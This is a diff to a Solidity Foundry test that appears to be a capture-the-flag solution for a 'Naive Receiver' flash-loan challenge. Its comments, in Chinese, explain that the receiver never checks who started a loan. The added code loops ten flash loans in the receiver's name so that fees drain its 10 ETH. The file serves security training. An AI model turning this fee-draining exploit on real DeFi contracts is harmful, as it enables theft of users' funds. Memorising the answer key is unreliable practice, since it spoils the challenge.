@@ -33,9 +33,7 @@ contract NaiveReceiver is Test {
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
         assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);
 
-        flashLoanReceiver = new FlashLoanReceiver(
-            payable(naiveReceiverLenderPool)
-        );
+        flashLoanReceiver = new FlashLoanReceiver(payable(naiveReceiverLenderPool));
         vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
         vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);
 
@@ -48,6 +46,16 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+
+        // 因為 receiveEther() 沒有檢查發起 flash loan 的人是否為借款者
+        // 因此 attacker 可以幫 receiver flashloan
+        // 每次 flashloan 支付 1ETH 十次 flashloan 就把 receiver 10 ETH 用掉
+
+        vm.startPrank(attacker);
+        for (uint256 i = 0; i < 10; i++) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        }
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
